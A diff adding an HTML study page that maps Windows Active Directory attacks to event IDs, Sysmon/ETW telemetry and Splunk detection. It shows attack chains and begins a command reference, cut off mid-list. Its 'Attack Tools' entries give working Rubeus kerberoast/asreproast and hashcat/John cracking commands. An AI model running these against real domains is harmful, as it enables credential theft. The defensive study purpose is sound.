@@ -1,0 +1,1667 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Windows Security – Attack & Detection Knowledge Map</title>
+<style>
+:root {
+  --bg:#0d1117; --bg2:#161b22; --bg3:#21262d; --border:#30363d;
+  --text:#c9d1d9; --muted:#8b949e;
+  --red:#f85149; --red-d:#3d1212; --red-b:#7d2020;
+  --blue:#58a6ff; --blue-d:#0c1d3d; --blue-b:#1a4080;
+  --green:#3fb950; --green-d:#0c3d1d; --green-b:#1a6030;
+  --yellow:#e3b341; --yellow-d:#3d2c0c;
+  --purple:#bc8cff; --purple-d:#2d0c3d; --purple-b:#5a2e9a;
+  --orange:#f0883e; --orange-d:#3d1e0c;
+  --cyan:#76e3ea; --cyan-d:#0c2d3d;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',-apple-system,sans-serif;font-size:13px;line-height:1.5}
+a{color:var(--blue);text-decoration:none}
+
+/* ── HEADER ── */
+header{padding:28px 32px 20px;border-bottom:1px solid var(--border);background:var(--bg2)}
+header h1{font-size:22px;font-weight:700;letter-spacing:.5px;color:#fff}
+header p{color:var(--muted);margin-top:4px;font-size:12px}
+
+/* ── SECTION WRAPPER ── */
+.section{padding:24px 32px}
+.section-title{font-size:13px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:var(--muted);margin-bottom:16px;display:flex;align-items:center;gap:8px}
+.section-title::after{content:'';flex:1;height:1px;background:var(--border)}
+
+/* ── 3-NOTE FLOW ── */
+.note-flow{display:grid;grid-template-columns:1fr auto 1fr auto 1fr;gap:0;align-items:center}
+.note-box{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:18px;position:relative}
+.note-box.red{border-color:var(--red-b);background:var(--red-d)}
+.note-box.blue{border-color:var(--blue-b);background:var(--blue-d)}
+.note-box.green{border-color:var(--green-b);background:var(--green-d)}
+.note-box .badge{display:inline-block;font-size:10px;font-weight:700;padding:2px 8px;border-radius:20px;margin-bottom:8px;text-transform:uppercase;letter-spacing:.5px}
+.badge-red{background:var(--red-b);color:var(--red)}
+.badge-blue{background:var(--blue-b);color:var(--blue)}
+.badge-green{background:var(--green-b);color:var(--green)}
+.badge-purple{background:var(--purple-b);color:var(--purple)}
+.badge-yellow{background:var(--yellow-d);color:var(--yellow)}
+.note-box h3{font-size:14px;font-weight:700;margin-bottom:6px}
+.note-box .file{font-size:11px;color:var(--muted);font-family:monospace;margin-bottom:10px}
+.note-box ul{padding-left:14px;color:var(--muted);font-size:12px;display:flex;flex-direction:column;gap:3px}
+.note-box ul li{color:var(--text)}
+.flow-arrow{text-align:center;font-size:22px;color:var(--muted);padding:0 8px}
+
+/* ── FILTERS ── */
+.filters{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:20px}
+.filter-btn{background:var(--bg3);border:1px solid var(--border);color:var(--muted);padding:5px 14px;border-radius:20px;cursor:pointer;font-size:12px;font-weight:500;transition:all .15s}
+.filter-btn:hover{border-color:var(--blue);color:var(--blue)}
+.filter-btn.active{background:var(--blue-d);border-color:var(--blue);color:var(--blue)}
+
+/* ── ATTACK GRID ── */
+.attack-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:14px}
+.card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;overflow:hidden;transition:border-color .15s,transform .1s;cursor:pointer}
+.card:hover{border-color:var(--muted);transform:translateY(-1px)}
+.card.expanded{border-color:var(--blue)}
+.card-header{padding:14px 16px;display:flex;align-items:flex-start;gap:12px}
+.card-icon{width:36px;height:36px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
+.card-meta{flex:1}
+.card-meta h4{font-size:14px;font-weight:700;color:#fff;margin-bottom:3px}
+.card-meta .desc{font-size:12px;color:var(--muted)}
+.card-tags{display:flex;flex-wrap:wrap;gap:5px;padding:0 16px 10px}
+.tag{font-size:10px;padding:2px 7px;border-radius:4px;font-weight:600;text-transform:uppercase;letter-spacing:.3px}
+.tag-event{background:#1a2a1a;color:var(--green);border:1px solid #2a4a2a}
+.tag-sysmon{background:#1a1a2a;color:var(--purple);border:1px solid #2a2a4a}
+.tag-etw{background:#2a1a0a;color:var(--orange);border:1px solid #4a2a0a}
+.tag-splunk{background:#0a1a2a;color:var(--cyan);border:1px solid #0a3a4a}
+.tag-source{background:var(--bg3);color:var(--muted);border:1px solid var(--border)}
+
+.card-detail{display:none;padding:14px 16px;border-top:1px solid var(--border);background:var(--bg)}
+.card.expanded .card-detail{display:block}
+
+.detail-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:8px}
+.detail-block{background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:10px}
+.detail-block h5{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:var(--muted);margin-bottom:6px}
+.detail-block p,.detail-block li{font-size:12px;color:var(--text)}
+.detail-block ul{padding-left:14px;display:flex;flex-direction:column;gap:3px}
+.event-pill{display:inline-block;background:#0c3d1d;color:var(--green);border:1px solid #1a6030;border-radius:4px;padding:1px 7px;font-size:11px;font-family:monospace;font-weight:700;margin:2px 2px 2px 0}
+.chain-arrow{color:var(--yellow);font-weight:700;margin:0 4px}
+.honeypot-badge{display:inline-flex;align-items:center;gap:4px;font-size:11px;color:var(--yellow);background:var(--yellow-d);border:1px solid #6a4a10;border-radius:4px;padding:2px 8px;margin-top:6px}
+
+/* ── ATTACK CHAINS ── */
+.chain-container{display:flex;flex-direction:column;gap:10px}
+.chain-row{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:12px 16px;display:flex;align-items:center;flex-wrap:wrap;gap:6px}
+.chain-node{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:4px 10px;font-size:12px;font-weight:600;color:var(--text)}
+.chain-node.pivot{border-color:var(--red-b);color:var(--red);background:var(--red-d)}
+.chain-node.goal{border-color:var(--yellow-d);color:var(--yellow);background:var(--yellow-d)}
+.chain-label{font-size:11px;color:var(--muted);margin-left:auto}
+
+/* ── EVENT ID TABLE ── */
+.event-table{width:100%;border-collapse:collapse;font-size:12px}
+.event-table th{background:var(--bg3);color:var(--muted);font-weight:700;text-transform:uppercase;letter-spacing:.5px;padding:8px 12px;text-align:left;border-bottom:1px solid var(--border)}
+.event-table td{padding:8px 12px;border-bottom:1px solid var(--border);vertical-align:top}
+.event-table tr:hover td{background:var(--bg2)}
+.event-table .eid{font-family:monospace;font-weight:700;color:var(--green);font-size:13px}
+.event-table .attacks{display:flex;flex-wrap:wrap;gap:4px}
+.event-table .atk-pill{background:var(--red-d);color:var(--red);border:1px solid var(--red-b);border-radius:4px;padding:1px 6px;font-size:10px}
+
+/* ── ATTACK PATH MAP ── */
+.path-map{overflow-x:auto;padding-bottom:8px}
+.path-phases{display:flex;gap:0;align-items:flex-start;min-width:1100px}
+.phase-col{flex:1;display:flex;flex-direction:column;gap:7px;padding:0 6px}
+.phase-header{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:var(--muted);text-align:center;padding:6px 4px;border-bottom:1px solid var(--border);margin-bottom:4px}
+.path-node{border-radius:6px;padding:7px 10px;font-size:11px;font-weight:600;text-align:center;border:1px solid}
+.path-node.red{background:var(--red-d);border-color:var(--red-b);color:var(--red)}
+.path-node.blue{background:var(--blue-d);border-color:var(--blue-b);color:var(--blue)}
+.path-node.green{background:var(--green-d);border-color:var(--green-b);color:var(--green)}
+.path-node.yellow{background:var(--yellow-d);border-color:#6a4a10;color:var(--yellow)}
+.path-node.purple{background:var(--purple-d);border-color:var(--purple-b);color:var(--purple)}
+.path-node.orange{background:var(--orange-d);border-color:#6a3a10;color:var(--orange)}
+.path-node.muted{background:var(--bg3);border-color:var(--border);color:var(--text)}
+.path-note{font-size:10px;color:var(--muted);text-align:center;padding:1px 4px;margin-top:-3px}
+.phase-arrow{display:flex;align-items:flex-start;justify-content:center;font-size:20px;color:var(--muted);padding:0 2px;flex-shrink:0;padding-top:34px}
+
+/* ── HIDDEN ── */
+.card.hidden{display:none}
+</style>
+</head>
+<body>
+
+<header>
+  <h1>Windows Security – Attack &amp; Detection Knowledge Map</h1>
+  <p>Visual bridge across: <strong>Windows Attacks.md</strong> &nbsp;|&nbsp; <strong>Windows Event Logs and Finding Evil.md</strong> &nbsp;|&nbsp; <strong>Detecting Windows Attacks.md</strong></p>
+</header>
+
+<!-- ══════════════════════════════════════════════════
+     SECTION 1 – HOW THE 3 NOTES CONNECT
+══════════════════════════════════════════════════ -->
+<div class="section">
+  <div class="section-title">How the 3 Notes Connect</div>
+  <div class="note-flow">
+
+    <div class="note-box red">
+      <span class="badge badge-red">Red Team</span>
+      <h3>Windows Attacks.md</h3>
+      <div class="file">Windows Attacks.md</div>
+      <ul>
+        <li>Attack mechanics &amp; tooling</li>
+        <li>Rubeus, Mimikatz, Certify</li>
+        <li>Prevention strategies</li>
+        <li>Honeypot configurations</li>
+        <li>Kerberoast, AS-REP, DCSync, Golden Ticket, ESC1…</li>
+      </ul>
+    </div>
+
+    <div class="flow-arrow">&#8594;<br><span style="font-size:10px;color:var(--muted)">Event IDs<br>triggered</span></div>
+
+    <div class="note-box blue">
+      <span class="badge badge-blue">Detection Layer</span>
+      <h3>Windows Event Logs &amp; Finding Evil</h3>
+      <div class="file">Windows Event Logs and Finding Evil.md</div>
+      <ul>
+        <li>Sysmon (EID 1, 3, 7, 10)</li>
+        <li>ETW architecture &amp; providers</li>
+        <li>Get-WinEvent / FilterHashtable / XPath</li>
+        <li>DLL Hijack, PPID Spoof, LSASS dump, .NET inject</li>
+        <li>ETW: Kernel-Process, DotNETRuntime, Threat-Intelligence</li>
+      </ul>
+    </div>
+
+    <div class="flow-arrow">&#8594;<br><span style="font-size:10px;color:var(--muted)">Queried via<br>SIEM</span></div>
+
+    <div class="note-box green">
+      <span class="badge badge-green">Blue Team / SIEM</span>
+      <h3>Detecting Windows Attacks</h3>
+      <div class="file">Detecting windows Attacks.md</div>
+      <ul>
+        <li>Splunk SPL queries per attack</li>
+        <li>SilkETW → LDAP &amp; .NET telemetry</li>
+        <li>Detection cheat sheet (14 attacks)</li>
+        <li>Recon, PtH, PtT, OtH, DCSync, DCShadow…</li>
+        <li>Ransomware, DNS exfil, Beaconing</li>
+      </ul>
+    </div>
+
+  </div>
+
+  <div style="margin-top:14px;background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:14px 18px;font-size:12px;color:var(--muted)">
+    <strong style="color:var(--yellow)">The Bridge:</strong>
+    &nbsp;Windows Attacks.md shows <em>what fires</em> the events &rarr;
+    Windows Event Logs.md explains <em>how to collect</em> them (Sysmon / ETW / Get-WinEvent) &rarr;
+    Detecting Windows Attacks.md shows <em>how to query</em> them in Splunk.
+    &nbsp;&nbsp;Every detection flows through <strong style="color:var(--green)">Event IDs</strong>.
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════
+     SECTION 2 – ATTACK CARDS
+══════════════════════════════════════════════════ -->
+<div class="section">
+  <div class="section-title">Attack Cards – click to expand</div>
+
+  <div class="filters">
+    <button class="filter-btn active" onclick="filterCards('all',this)">All</button>
+    <button class="filter-btn" onclick="filterCards('cred',this)">Credential Access</button>
+    <button class="filter-btn" onclick="filterCards('kerberos',this)">Kerberos</button>
+    <button class="filter-btn" onclick="filterCards('lateral',this)">Lateral Movement</button>
+    <button class="filter-btn" onclick="filterCards('persistence',this)">Persistence / Domain</button>
+    <button class="filter-btn" onclick="filterCards('recon',this)">Recon</button>
+    <button class="filter-btn" onclick="filterCards('splunk',this)">Has Splunk Query</button>
+    <button class="filter-btn" onclick="filterCards('honeypot',this)">Has Honeypot</button>
+    <button class="filter-btn" onclick="filterCards('sysmon',this)">Sysmon Coverage</button>
+  </div>
+
+  <div class="attack-grid" id="attackGrid"></div>
+</div>
+
+<!-- ══════════════════════════════════════════════════
+     SECTION 3 – ATTACK CHAINS
+══════════════════════════════════════════════════ -->
+<div class="section">
+  <div class="section-title">Attack Chains – how techniques connect</div>
+  <div class="chain-container">
+
+    <div class="chain-row">
+      <div class="chain-node">Kerberoasting</div>
+      <span class="chain-arrow">&rarr;</span>
+      <div class="chain-node">Service acct with Constrained Delegation?</div>
+      <span class="chain-arrow">&rarr;</span>
+      <div class="chain-node pivot">Constrained Delegation</div>
+      <span class="chain-arrow">&rarr;</span>
+      <div class="chain-node goal">Domain Admin</div>
+      <div class="chain-label">crack SPN pw &rarr; S4U2proxy to DC</div>
+    </div>
+
+    <div class="chain-row">
+      <div class="chain-node">PrinterBug (Coerce)</div>
+      <span class="chain-arrow">&rarr;</span>
+      <div class="chain-node">NTLM Relay (ntlmrelayx)</div>
+      <span class="chain-arrow">&rarr;</span>
+      <div class="chain-node pivot">DCSync</div>
+      <span class="chain-arrow">&rarr;</span>
+      <div class="chain-node goal">All NTLM hashes</div>
+      <div class="chain-label">requires SMB signing disabled on DC2</div>
+    </div>
+
+    <div class="chain-row">
+      <div class="chain-node">DCSync</div>
+      <span class="chain-arrow">&rarr;</span>
+      <div class="chain-node">krbtgt NTLM hash</div>
+      <span class="chain-arrow">&rarr;</span>
+      <div class="chain-node pivot">Golden Ticket</div>
+      <span class="chain-arrow">&rarr;</span>
+      <div class="chain-node goal">Permanent domain access</div>
+      <div class="chain-label">forge any TGT, persists across pw resets (except krbtgt)</div>
+    </div>
+
+    <div class="chain-row">
+      <div class="chain-node">Coerce + Unconstrained Delegation</div>
+      <span class="chain-arrow">&rarr;</span>
+      <div class="chain-node">DC TGT cached on WS001</div>
+      <span class="chain-arrow">&rarr;</span>
+      <div class="chain-node pivot">Pass-the-Ticket</div>
+      <span class="chain-arrow">&rarr;</span>
+      <div class="chain-node goal">Domain Admin</div>
+      <div class="chain-label">extract TGT from memory via Rubeus</div>
+    </div>
+
+    <div class="chain-row">
+      <div class="chain-node">AS-REProasting</div>
+      <span class="chain-arrow">&rarr;</span>
+      <div class="chain-node">Crack TGT hash</div>
+      <span class="chain-arrow">&rarr;</span>
+      <div class="chain-node pivot">Pass-the-Hash / Overpass-the-Hash</div>
+      <span class="chain-arrow">&rarr;</span>
+      <div class="chain-node goal">Authenticated session</div>
+      <div class="chain-label">offline crack &rarr; reuse NTLM or request real TGT</div>
+    </div>
+
+    <div class="chain-row">
+      <div class="chain-node">GPP Password</div>
+      <span class="chain-arrow">&rarr;</span>
+      <div class="chain-node">SYSVOL cpassword</div>
+      <span class="chain-arrow">&rarr;</span>
+      <div class="chain-node pivot">Credentials in Shares</div>
+      <span class="chain-arrow">&rarr;</span>
+      <div class="chain-node goal">Service account pivot</div>
+      <div class="chain-label">AES key publicly known; decrypt instantly</div>
+    </div>
+
+    <div class="chain-row">
+      <div class="chain-node">ESC1 (AD CS)</div>
+      <span class="chain-arrow">&rarr;</span>
+      <div class="chain-node">Certificate with SAN = Administrator</div>
+      <span class="chain-arrow">&rarr;</span>
+      <div class="chain-node pivot">Authenticate as any user</div>
+      <span class="chain-arrow">&rarr;</span>
+      <div class="chain-node goal">Domain Admin</div>
+      <div class="chain-label">CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT misconfig</div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════
+     SECTION 3.5 – ATTACK PATH MAP
+══════════════════════════════════════════════════ -->
+<div class="section">
+  <div class="section-title">Attack Path Map – Initial Access → Domain Takeover</div>
+  <div class="path-map">
+    <div class="path-phases">
+
+      <!-- Phase 1 -->
+      <div class="phase-col">
+        <div class="phase-header">① Initial Access</div>
+        <div class="path-node red">Password Spraying</div>
+        <div class="path-note">EID 4625 / 4768 err 0x6</div>
+        <div class="path-node red">LLMNR / NBT-NS Poison</div>
+        <div class="path-note">Responder → Net-NTLMv2 capture</div>
+        <div class="path-node red">Phishing / RCE</div>
+        <div class="path-note">arbitrary shell on endpoint</div>
+      </div>
+
+      <div class="phase-arrow">→</div>
+
+      <!-- Phase 2 -->
+      <div class="phase-col">
+        <div class="phase-header">② Foothold</div>
+        <div class="path-node muted">Low-priv domain user</div>
+        <div class="path-note">valid credentials, domain-joined</div>
+        <div class="path-node orange">Local Admin on endpoint</div>
+        <div class="path-note">via exploit / weak password</div>
+      </div>
+
+      <div class="phase-arrow">→</div>
+
+      <!-- Phase 3 -->
+      <div class="phase-col">
+        <div class="phase-header">③ Recon</div>
+        <div class="path-node blue">BloodHound / SharpHound</div>
+        <div class="path-note">LDAP burst · SilkETW catches filter</div>
+        <div class="path-node blue">Native Recon</div>
+        <div class="path-note">whoami / net / nltest · Sysmon EID 1</div>
+        <div class="path-node blue">Find Delegation / SPNs</div>
+        <div class="path-note">PS query msDS-AllowedToDelegateTo · EID 4104</div>
+      </div>
+
+      <div class="phase-arrow">→</div>
+
+      <!-- Phase 4 -->
+      <div class="phase-col">
+        <div class="phase-header">④ Credential Acquisition</div>
+        <div class="path-node purple">Kerberoasting</div>
+        <div class="path-note">SPN user TGS → crack → NTLM hash · EID 4769</div>
+        <div class="path-node purple">AS-REPRoasting</div>
+        <div class="path-note">pre-auth off → TGT → crack · EID 4768 Pre_Auth=0</div>
+        <div class="path-node orange">LSASS Dump (Mimikatz)</div>
+        <div class="path-note">needs local admin · Sysmon EID 10</div>
+        <div class="path-node orange">TGTs in Memory (Rubeus)</div>
+        <div class="path-note">harvest active tickets · Sysmon EID 10</div>
+      </div>
+
+      <div class="phase-arrow">→</div>
+
+      <!-- Phase 5 -->
+      <div class="phase-col">
+        <div class="phase-header">⑤ With Hash / Ticket</div>
+        <div class="path-node yellow">Pass-the-Hash</div>
+        <div class="path-note">NTLM lateral · EID 4624 LogonType=9 seclogo</div>
+        <div class="path-node yellow">Overpass-the-Hash</div>
+        <div class="path-note">hash → real TGT · Sysmon EID 3 port 88</div>
+        <div class="path-node yellow">Silver Ticket</div>
+        <div class="path-note">svc hash → forge TGS · zero DC logs</div>
+        <div class="path-node yellow">Pass-the-Ticket</div>
+        <div class="path-note">stolen TGT inject · EID 4769 no prior 4768</div>
+      </div>
+
+      <div class="phase-arrow">→</div>
+
+      <!-- Phase 6 -->
+      <div class="phase-col">
+        <div class="phase-header">⑥ Escalation</div>
+        <div class="path-node red">Unconstrained Delegation</div>
+        <div class="path-note">coerce DC auth → steal DA TGT from LSASS</div>
+        <div class="path-node red">Constrained Delegation</div>
+        <div class="path-note">S4U2self → impersonate DA to allowed SPNs</div>
+        <div class="path-node red">DCSync</div>
+        <div class="path-note">EID 4662 DS-Replication-Get-Changes · needs DA</div>
+      </div>
+
+      <div class="phase-arrow">→</div>
+
+      <!-- Phase 7 -->
+      <div class="phase-col">
+        <div class="phase-header">⑦ Domain Takeover</div>
+        <div class="path-node green">Golden Ticket</div>
+        <div class="path-note">KRBTGT hash → forge any TGT · persistent access</div>
+        <div class="path-node green">DCShadow</div>
+        <div class="path-note">rogue DC → push AD changes · EID 4742 GC/ SPN</div>
+        <div class="path-node green">Full Domain Hash Dump</div>
+        <div class="path-note">all accounts compromised via DCSync</div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Key chains callout -->
+  <div style="margin-top:16px;display:flex;flex-direction:column;gap:8px">
+
+    <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:12px 16px;font-size:12px">
+      <strong style="color:var(--purple)">Kerberoasting → Silver Ticket:</strong>
+      <span style="color:var(--muted)"> Crack the TGS → get plaintext → derive NTLM hash → forge TGS for that service as any user.
+      Choose <span style="color:var(--yellow)">Silver Ticket</span> (Kerberos, no DC logs, single service) or
+      <span style="color:var(--yellow)">Pass-the-Hash</span> (NTLM, broader but leaves EID 4624 LogonType=9).</span>
+    </div>
+
+    <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:12px 16px;font-size:12px">
+      <strong style="color:var(--orange)">LSASS Dump → three roads:</strong>
+      <span style="color:var(--muted)"> Got a hash?
+      → <span style="color:var(--yellow)">PtH</span> (NTLM lateral) or
+      <span style="color:var(--yellow)">Overpass-the-Hash</span> (Kerberos lateral, stealthier, Rubeus port 88 IoC).
+      Got a TGT?
+      → <span style="color:var(--yellow)">Pass-the-Ticket</span> directly — no cracking needed.</span>
+    </div>
+
+    <div style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:12px 16px;font-size:12px">
+      <strong style="color:var(--red)">Unconstrained Delegation → Golden Ticket:</strong>
+      <span style="color:var(--muted)"> Compromise a UD server → coerce DC to authenticate → steal DC's TGT from LSASS →
+      PtT as DC → DCSync → KRBTGT hash → Golden Ticket. Full domain persistence achieved without ever brute-forcing a password.</span>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════
+     SECTION 4 – EVENT ID CROSS-REFERENCE
+══════════════════════════════════════════════════ -->
+<div class="section">
+  <div class="section-title">Event ID Cross-Reference</div>
+  <table class="event-table">
+    <thead>
+      <tr>
+        <th>Event ID</th>
+        <th>Description</th>
+        <th>Source</th>
+        <th>Attacks That Trigger It</th>
+        <th>Detection Notes</th>
+      </tr>
+    </thead>
+    <tbody id="eventTable"></tbody>
+  </table>
+</div>
+
+<!-- ══════════════════════════════════════════════════
+     SECTION 5 – DETECTION TOOL OVERVIEW
+══════════════════════════════════════════════════ -->
+<div class="section">
+  <div class="section-title">Detection Tool Layers</div>
+  <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px">
+
+    <div style="background:var(--bg2);border:1px solid var(--purple-b);border-radius:10px;padding:16px">
+      <div class="badge badge-purple" style="margin-bottom:8px">Sysmon</div>
+      <p style="font-size:12px;color:var(--muted);margin-bottom:10px">Microsoft Sysinternals driver + service. Fills gaps in Security log.</p>
+      <table style="width:100%;font-size:11px;border-collapse:collapse">
+        <tr><td style="padding:3px 6px;color:var(--purple);font-family:monospace;font-weight:700">EID 1</td><td style="padding:3px 6px;color:var(--muted)">Process Create (parent-child, cmdline)</td></tr>
+        <tr><td style="padding:3px 6px;color:var(--purple);font-family:monospace;font-weight:700">EID 3</td><td style="padding:3px 6px;color:var(--muted)">Network Connection (C2, OtH port 88)</td></tr>
+        <tr><td style="padding:3px 6px;color:var(--purple);font-family:monospace;font-weight:700">EID 7</td><td style="padding:3px 6px;color:var(--muted)">Image Loaded (DLL hijack, .NET inject)</td></tr>
+        <tr><td style="padding:3px 6px;color:var(--purple);font-family:monospace;font-weight:700">EID 10</td><td style="padding:3px 6px;color:var(--muted)">Process Access (LSASS dump)</td></tr>
+        <tr><td style="padding:3px 6px;color:var(--purple);font-family:monospace;font-weight:700">EID 22</td><td style="padding:3px 6px;color:var(--muted)">DNS Query (LLMNR honeypot hits)</td></tr>
+      </table>
+      <div style="margin-top:8px;font-size:11px;color:var(--muted)">Install: <code style="color:var(--purple)">sysmon.exe -i -accepteula -h md5,sha256,imphash -l -n</code></div>
+    </div>
+
+    <div style="background:var(--bg2);border:1px solid var(--orange-d);border-radius:10px;padding:16px;border-color:#6a3010">
+      <div class="badge" style="background:var(--orange-d);color:var(--orange);margin-bottom:8px">ETW Providers</div>
+      <p style="font-size:12px;color:var(--muted);margin-bottom:10px">Kernel-level telemetry. Deepest source, covers Sysmon blind spots.</p>
+      <table style="width:100%;font-size:11px;border-collapse:collapse">
+        <tr><td style="padding:3px 6px;color:var(--orange);font-weight:700">Kernel-Process</td><td style="padding:3px 6px;color:var(--muted)">Real parent (beats PPID spoof)</td></tr>
+        <tr><td style="padding:3px 6px;color:var(--orange);font-weight:700">DotNETRuntime</td><td style="padding:3px 6px;color:var(--muted)">In-memory .NET assembly names</td></tr>
+        <tr><td style="padding:3px 6px;color:var(--orange);font-weight:700">LDAP-Client</td><td style="padding:3px 6px;color:var(--muted)">BloodHound, Kerberoast LDAP queries</td></tr>
+        <tr><td style="padding:3px 6px;color:var(--orange);font-weight:700">Kernel-Network</td><td style="padding:3px 6px;color:var(--muted)">C2, exfil, PID-to-connection</td></tr>
+        <tr><td style="padding:3px 6px;color:var(--orange);font-weight:700">Threat-Intelligence</td><td style="padding:3px 6px;color:var(--muted)">PPL only – highest value (EDR)</td></tr>
+      </table>
+      <div style="margin-top:8px;font-size:11px;color:var(--muted)">Tool: <code style="color:var(--orange)">SilkETW / SilkService</code> &rarr; routes into Event Viewer + SIEM</div>
+    </div>
+
+    <div style="background:var(--bg2);border:1px solid #0a3a4a;border-radius:10px;padding:16px">
+      <div class="badge" style="background:#0a1a2a;color:var(--cyan);border:1px solid #0a3a4a;margin-bottom:8px">Splunk SPL</div>
+      <p style="font-size:12px;color:var(--muted);margin-bottom:10px">Queries on top of collected events. Pattern + correlation logic.</p>
+      <table style="width:100%;font-size:11px;border-collapse:collapse">
+        <tr><td style="padding:3px 6px;color:var(--cyan);font-weight:700">bin span=15m</td><td style="padding:3px 6px;color:var(--muted)">Time-bucket for spray detection</td></tr>
+        <tr><td style="padding:3px 6px;color:var(--cyan);font-weight:700">stats dc(user)</td><td style="padding:3px 6px;color:var(--muted)">Distinct users from same IP</td></tr>
+        <tr><td style="padding:3px 6px;color:var(--cyan);font-weight:700">SilkService-Log</td><td style="padding:3px 6px;color:var(--muted)">ETW source for BloodHound LDAP</td></tr>
+        <tr><td style="padding:3px 6px;color:var(--cyan);font-weight:700">spath + rename</td><td style="padding:3px 6px;color:var(--muted)">Parse XML ETW events in Splunk</td></tr>
+        <tr><td style="padding:3px 6px;color:var(--cyan);font-weight:700">transaction</td><td style="padding:3px 6px;color:var(--muted)">Chain 4769 requests per user session</td></tr>
+      </table>
+      <div style="margin-top:8px;font-size:11px;color:var(--muted)">Key source: <code style="color:var(--cyan)">XmlWinEventLog:Microsoft-Windows-Sysmon/Operational</code></div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════
+     SECTION 6 – COMMAND REFERENCE
+══════════════════════════════════════════════════ -->
+<div class="section">
+  <div class="section-title">Command Reference</div>
+
+  <!-- Tab bar -->
+  <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:20px" id="cmdTabs">
+    <button class="cmd-tab active" onclick="switchTab('attack',this)">Attack Tools</button>
+    <button class="cmd-tab" onclick="switchTab('detect',this)">Detection &amp; Collection</button>
+    <button class="cmd-tab" onclick="switchTab('splunk',this)">Splunk SPL</button>
+    <button class="cmd-tab" onclick="switchTab('zeek',this)">Zeek</button>
+    <button class="cmd-tab" onclick="switchTab('suricata',this)">Suricata</button>
+  </div>
+
+  <!-- Search bar -->
+  <div style="margin-bottom:16px">
+    <input id="cmdSearch" type="text" placeholder="Search commands, techniques, tools…"
+      oninput="filterCmds()"
+      style="width:100%;max-width:500px;background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:8px 14px;border-radius:8px;font-size:13px;outline:none"/>
+  </div>
+
+  <div id="cmdGrid" style="display:flex;flex-direction:column;gap:10px"></div>
+</div>
+
+<style>
+.cmd-tab{background:var(--bg3);border:1px solid var(--border);color:var(--muted);padding:6px 16px;border-radius:20px;cursor:pointer;font-size:12px;font-weight:600;transition:all .15s}
+.cmd-tab:hover{border-color:var(--blue);color:var(--blue)}
+.cmd-tab.active{background:var(--blue-d);border-color:var(--blue);color:var(--blue)}
+.cmd-block{background:var(--bg2);border:1px solid var(--border);border-radius:10px;overflow:hidden;transition:border-color .15s}
+.cmd-block:hover{border-color:var(--border)}
+.cmd-block-header{display:flex;align-items:flex-start;gap:12px;padding:12px 16px;cursor:pointer}
+.cmd-block-header:hover .cmd-title{color:var(--blue)}
+.cmd-type-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0;margin-top:4px}
+.cmd-title{font-size:13px;font-weight:700;color:var(--text);flex:1}
+.cmd-subtitle{font-size:11px;color:var(--muted);margin-top:2px}
+.cmd-badges{display:flex;flex-wrap:wrap;gap:5px;padding:0 16px 12px 38px}
+.cmd-bodies{padding:0 16px 14px 16px;display:flex;flex-direction:column;gap:8px}
+.cmd-body{background:var(--bg);border:1px solid var(--border);border-radius:6px;overflow:hidden}
+.cmd-body-label{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:var(--muted);padding:6px 12px 4px;border-bottom:1px solid var(--border)}
+.cmd-pre-wrap{position:relative}
+.cmd-pre{font-family:'Cascadia Code','Fira Code',monospace;font-size:12px;color:#e6edf3;background:var(--bg);padding:10px 44px 10px 14px;margin:0;white-space:pre-wrap;word-break:break-all;border:none;line-height:1.6}
+.copy-btn{position:absolute;top:7px;right:8px;background:var(--bg3);border:1px solid var(--border);color:var(--muted);border-radius:5px;padding:3px 8px;font-size:10px;cursor:pointer;transition:all .15s}
+.copy-btn:hover{background:var(--blue-d);border-color:var(--blue);color:var(--blue)}
+.copy-btn.copied{background:var(--green-d);border-color:var(--green-b);color:var(--green)}
+.cmd-block.hidden{display:none}
+</style>
+
+<script>
+const commands = [
+  // ── ATTACK TOOLS ──────────────────────────────────────────────
+  {
+    tab:"attack", title:"Kerberoasting", subtitle:"Extract all TGS tickets for SPN accounts",
+    attack:"Kerberoasting", source:"Windows Attacks",
+    color:"#f85149",
+    cmds:[
+      {label:"Rubeus – dump all SPN tickets",       code:"./Rubeus.exe kerberoast /outfile:spn.txt"},
+      {label:"hashcat – crack TGS (RC4 mode 13100)",code:"hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile=\"cracked.txt\""},
+      {label:"John – crack TGS (alternative)",      code:"sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot"},
+    ]
+  },
+  {
+    tab:"attack", title:"AS-REProasting", subtitle:"Dump TGT hashes for accounts with pre-auth disabled",
+    attack:"AS-REProasting", source:"Windows Attacks",
+    color:"#f85149",
+    cmds:[
+      {label:"Rubeus – extract AS-REP hashes",            code:"./Rubeus.exe asreproast /outfile:asrep.txt"},
